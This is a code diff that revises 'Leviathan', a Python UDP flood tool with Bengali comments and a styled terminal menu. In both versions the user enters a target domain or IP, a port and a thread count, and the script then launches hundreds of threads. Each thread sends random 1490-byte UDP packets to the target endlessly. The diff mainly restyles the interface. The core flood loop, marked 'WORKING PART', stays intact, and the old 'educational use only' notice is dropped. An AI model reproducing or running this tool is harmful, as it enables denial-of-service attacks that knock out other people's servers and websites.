@@ -6,7 +6,7 @@ import random
 import threading
 from platform import system
 
-# --- ADVANCED COLOR SCHEME ---
+# --- ULTRA HIGHLIGHTED COLORS ---
 W = '\033[1;37m'  # White Bold
 G = '\033[1;32m'  # Green Bold
 R = '\033[1;31m'  # Red Bold
@@ -15,135 +15,115 @@ B = '\033[1;34m'  # Blue Bold
 C = '\033[1;36m'  # Cyan Bold
 M = '\033[1;35m'  # Magenta Bold
 RE = '\033[0m'    # Reset
-
-# Background Highlights
-HG = '\033[1;42;30m' 
-HR = '\033[1;41;37m' 
-HB = '\033[1;44;37m' 
+HG = '\033[1;42;30m' # Highlight Green
+HR = '\033[1;41;37m' # Highlight Red
+HB = '\033[1;44;37m' # Highlight Blue
+HC = '\033[1;46;30m' # Highlight Cyan
 
 def clear():
     os.system('cls' if system() == "Windows" else 'clear')
 
-def typing_effect(text, speed=0.02):
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(speed)
-    print()
-
-def banner():
+def logo():
     clear()
-    # Unique Leviathan Aesthetic Banner
-    print(f"""{C}
-    ▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚
-    {B}██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗
-    ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║
-    ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║
-    ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║
-    ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║
-    ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
-    {C}▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚
-    {W} 🔱 {HB} STABILITY: v2.0 {RE} 🔱 {HG} CORE: MULTI-THREAD {RE} 🔱 {HB} DEPLOY: LVT-2025 {RE}
-    {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}""")
+    print(f"""
+{C}   ██╗     ███████╗██╗   ██╗██╗ █████╗ ████████╗██╗  ██╗ █████╗ ███╗   ██╗
+   ██║     ██╔════╝██║   ██║██║██╔══██╗╚══██╔══╝██║  ██║██╔══██╗████╗  ██║
+   ██║     █████╗  ██║   ██║██║███████║   ██║   ███████║███████║██╔██╗ ██║
+   ██║     ██╔══╝  ╚██╗ ██╔╝██║██╔══██║   ██║   ██╔══██║██╔══██║██║╚██╗██║
+   ███████╗███████╗ ╚████╔╝ ██║██║  ██║   ██║   ██║  ██║██║  ██║██║ ╚████║
+   ╚══════╝╚══════╝  ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
+{W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+           {HG}  SYSTEM VERSION: 4.0  {RE}   {HB}  POWER: MULTI-THREADED  {RE}
+{W}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RE}
+    """)
 
-def advanced_loading():
-    clear()
-    banner()
-    print(f"\n{B}[*] {W}INITIALIZING LEVIATHAN QUANTUM ENGINE...")
-    tasks = ["CONNECTING TO PROTOCOLS", "GENERATING UDP PAYLOADS", "BYPASSING FIREWALLS", "STABILIZING THREADS"]
-    
-    for task in tasks:
-        sys.stdout.write(f"\r{Y}[~] {W}{task.ljust(30)} {G}")
-        for _ in range(3):
-            sys.stdout.write(".")
-            sys.stdout.flush()
-            time.sleep(0.4)
-    
-    print(f"\n\n{G}██████████████████████████████████████████████████ 100%")
-    print(f"\n{HG}  ENGINE READY: SYSTEM ONLINE  {RE}")
-    time.sleep(1)
+# ---------------------------------------------------------
+# [!] WORKING PART (CORE ENGINE) - এই অংশটিই আসল কাজ করে
+# ---------------------------------------------------------
 
-# --- ATTACK ENGINE ---
-sent_packets = 0
-def start_strike(ip, port, packet_data):
-    global sent_packets
+sent = 0
+def attack():
+    global sent
+    # প্যাকেট ডাটা জেনারেট করা (1490 bytes standard MTU)
+    bytes_data = random._urandom(1490)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
     while True:
         try:
-            sock.sendto(packet_data, (ip, port))
-            sent_packets += 1
-            # Advanced Scrolling Output
-            sys.stdout.write(f"\r{C}[L-STRIKE]{RE} {W}Target:{R}{ip}{W} {B}Port:{Y}{port}{W} {G}Packets:{M}{sent_packets}{RE}")
-            sys.stdout.flush()
+            # লক্ষ্যবস্তুতে প্যাকেট পাঠানো
+            sock.sendto(bytes_data, (target_ip, target_port))
+            sent += 1
+            # লাইভ স্ট্যাটাস প্রিন্ট (হাইলাইটেড)
+            print(f"{G}LEVIATHAN_STRIKE {W}>> {R}{target_ip}{W} | {B}PORT:{Y}{target_port} {W}| {HG} SENT:{sent} {RE}", end="\r")
         except:
             pass
 
-# --- UI FLOW ---
-advanced_loading()
+# ---------------------------------------------------------
+
+def startup():
+    clear()
+    print(f"\n\n{B}[>] {W}BOOTING LEVIATHAN CORE ENGINE...")
+    time.sleep(1)
+    for i in range(1, 101, 5):
+        sys.stdout.write(f"\r{B}[{G}{'█' * (i // 2)}{W}{'.' * (50 - (i // 2))}{B}] {Y}{i}%")
+        sys.stdout.flush()
+        time.sleep(0.03)
+    print(f"\n\n{HG}  SUCCESS: ALL MODULES LOADED  {RE}\n")
+    time.sleep(1)
+
+startup()
 
 while True:
-    banner()
-    print(f"\n{G}┌─[ {W}SELECT OPERATION{G} ]")
-    print(f"{G}│")
-    print(f"{G}├── {W}[{C}01{W}] {G}DOMAIN STRIKE  {W}(Website Target)")
-    print(f"{G}├── {W}[{C}02{W}] {G}IP ADDRESS     {W}(Server Target)")
-    print(f"{G}├── {W}[{C}03{W}] {G}ABOUT CORE     {W}(Information)")
-    print(f"{G}└── {W}[{C}00{W}] {R}TERMINATE      {W}(Close System)")
+    logo()
+    print(f" {HC}  TARGET SELECTION  {RE} ")
+    print(f"\n {G}[01]{W} ATTACK DOMAIN (URL)")
+    print(f" {G}[02]{W} ATTACK DIRECT IP")
+    print(f" {R}[00]{W} TERMINATE SYSTEM")
     
-    choice = input(f"\n{C}Leviathan@Terminal{W}:~$ {Y}").strip()
+    choice = input(f"\n{C}╔═══[{G}Leviathan@Console{C}]\n╚══{B}> {Y}")
 
-    if choice in ['1', '01']:
-        domain = input(f"\n{B}┌──[ {W}TARGET URL {B}]\n└──> {Y}").strip()
+    if choice == '1':
+        domain = input(f"\n{B}[?]{W} TARGET URL: {Y}")
         try:
             target_ip = socket.gethostbyname(domain)
             break
         except:
-            print(f"{R}[!] ERROR: UNABLE TO RESOLVE DOMAIN{RE}")
+            print(f"{HR} ERROR: INVALID DOMAIN {RE}")
             time.sleep(2)
-    elif choice in ['2', '02']:
-        target_ip = input(f"\n{B}┌──[ {W}TARGET IP {B}]\n└──> {Y}").strip()
+    elif choice == '2':
+        target_ip = input(f"\n{B}[?]{W} TARGET IP: {Y}")
         break
-    elif choice in ['3', '03']:
-        banner()
-        print(f"\n{HB}  SYSTEM INFORMATION  {RE}")
-        typing_effect(f"{W}DEVELOPER: {C}LEVIATHAN")
-        typing_effect(f"{W}NETWORK  : {G}UDP FLOOD ENGINE")
-        typing_effect(f"{W}LEGAL    : {R}EDUCATIONAL USE ONLY")
-        input(f"\n{Y}Press Enter to Return...")
-    elif choice in ['0', '00']:
+    elif choice == '0':
         sys.exit()
-    else:
-        print(f"{R}[!] INVALID ACCESS CODE{RE}")
-        time.sleep(1)
 
-# CONFIGURATION
-banner()
-print(f"\n{C}[+] {W}TARGET LOCKED: {G}{target_ip}")
-port_in = input(f"{C}[?] {W}ASSIGN PORT (Press Enter for Random): {Y}").strip()
-port = int(port_in) if port_in else 80
+# পোর্টের কনফিগারেশন
+logo()
+print(f" {HC}  ATTACK CONFIGURATION  {RE} ")
+target_port = input(f"\n{W}TARGET PORT (Default 80): {Y}")
+target_port = int(target_port) if target_port else 80
 
-threads = input(f"{C}[?] {W}THREADS POWER (Recommend 1000): {Y}").strip()
-threads = int(threads) if threads else 1000
+# থ্রেড কাউন্ট (পাওয়ার নির্ধারণ)
+print(f"\n{Y}[!] Higher threads = More power but may slow your phone.")
+thread_count = input(f"{W}THREADS (Recommend 500-1000): {Y}")
+thread_count = int(thread_count) if thread_count else 500
 
-payload = random._urandom(1490)
-
-# START ANIMATION
-print(f"\n{HR}  SYSTEM LAUNCHING IN 3 SECONDS...  {RE}")
+# অ্যাটাক শুরু
+print(f"\n{HR}  WARNING: LEVIATHAN IS LAUNCHING IN 3 SEC...  {RE}")
 time.sleep(3)
 clear()
-banner()
+logo()
 
-# MULTI-THREADING LAUNCH
-for i in range(threads):
-    strike_thread = threading.Thread(target=start_strike, args=(target_ip, port, payload))
-    strike_thread.daemon = True
-    strike_thread.start()
+# WORKING PART: থ্রেডগুলো চালু করা
+for i in range(thread_count):
+    thread = threading.Thread(target=attack)
+    thread.daemon = True # যাতে টুল বন্ধ করলে থ্রেডও বন্ধ হয়
+    thread.start()
 
+# স্ক্রিন যাতে সাথে সাথে বন্ধ না হয়
 try:
     while True:
-        # প্যাকেট কাউন্ট আপডেট করার জন্য মেইন লুপ সচল রাখা
-        time.sleep(0.1)
+        time.sleep(1)
 except KeyboardInterrupt:
-    print(f"\n\n{HR}  OPERATION HALTED BY USER  {RE}")
-    print(f"{G}[✔] TOTAL DATA SHOT: {sent_packets} Packets{RE}")
+    print(f"\n\n{HR}  SYSTEM HALTED BY OPERATOR  {RE}")
+    print(f"{HC} FINAL PACKET COUNT: {sent} {RE}")
     sys.exit()
